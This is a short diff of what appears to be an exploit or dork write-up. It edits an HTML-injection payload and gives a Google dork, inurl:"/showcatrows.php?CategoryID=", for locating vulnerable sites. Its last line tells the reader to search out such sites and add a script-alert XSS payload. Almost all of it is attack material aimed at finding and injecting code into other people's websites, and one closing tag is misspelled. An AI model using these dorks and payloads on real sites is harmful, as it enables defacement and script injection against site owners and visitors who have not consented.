@@ -16,6 +16,6 @@ Dork :
 
 inurl:"/showcatrows.php?CategoryID="
 
-"><marquee><h1>??????</h1></mmarque
+"><marquee><h1>Your text</h1></mmarque
 
 Search Site And Add This Xss Dork <script>alert("Xss")</script>
